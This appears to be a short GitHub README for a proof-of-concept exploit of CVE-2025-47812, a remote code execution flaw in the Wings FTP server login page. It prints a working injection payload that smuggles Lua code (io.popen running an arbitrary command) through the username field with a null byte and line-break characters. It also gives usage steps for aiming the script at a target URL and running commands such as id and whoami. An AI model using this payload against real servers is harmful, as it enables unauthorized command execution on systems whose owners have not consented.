## CVE-2025-47812.py

Wings FTP server RCE in Login Pages 

Payload lokks like :- 
```bash
{encode_username%00 ]] %0d local h = io.popen("command") local r = h:read("*a") h%3aclose() print(r) -- password"" }
```
# Menu
```bash
python3 CVE.py
# Put url of target like this :-  http://ftp.server.com
# put command in target server :- last -n 5 , id , whoami
```

### Proof of Running Output
<img width="1199" height="512" alt="image" src="https://github.com/0xmrsecurity/Public_Poc/blob/main/wings_FTP_Server/ftp.png" />
